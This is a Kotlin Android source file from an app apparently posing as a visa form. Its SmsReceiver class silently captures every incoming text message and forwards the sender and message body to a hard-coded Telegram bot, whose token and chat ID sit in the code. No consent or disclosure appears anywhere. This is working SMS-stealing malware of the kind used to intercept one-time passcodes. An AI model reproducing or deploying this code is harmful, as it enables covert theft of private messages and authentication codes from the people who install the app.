package com.example.visa_form_app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.FormBody
import okhttp3.Request
import okhttp3.Callback
import okhttp3.Call
import okhttp3.Response
import java.io.IOException

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle: Bundle? = intent.extras
            try {
                if (bundle != null) {
                    @Suppress("DEPRECATION")
                    val pdus = bundle.get("pdus") as? Array<*>
                    pdus?.let { pduArray ->
                        for (pdu in pduArray) {
                            pdu?.let {
                                val format = bundle.getString("format")
                                val sms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                    SmsMessage.createFromPdu(it as ByteArray, format)
                                } else {
                                    @Suppress("DEPRECATION")
                                    SmsMessage.createFromPdu(it as ByteArray)
                                }
                                sms?.let { message ->
                                    val sender = message.originatingAddress ?: "Unknown"
                                    val messageBody = message.messageBody ?: ""
                                    sendToTelegram(sender, messageBody)
                                }
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("SmsReceiver", "Exception: ${e.message}")
            }
        }
    }

    private fun sendToTelegram(sender: String, message: String) {
        val telegramToken = "8152617951:AAEToQf-M6rYZlS_1yVAjiaRuN7Tq8paHyc"
        val chatId = "8241331214"
        val text = "Incoming SMS (Native):\nFrom: $sender\nMessage: $message"
        val url = "https://api.telegram.org/bot$telegramToken/sendMessage"

        val client = OkHttpClient()
        val requestBody = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text)
            .build()
        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("SmsReceiver", "Telegram send failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    Log.i("SmsReceiver", "Telegram send response: ${it.body?.string()}")
                }
            }
        })
    }
}
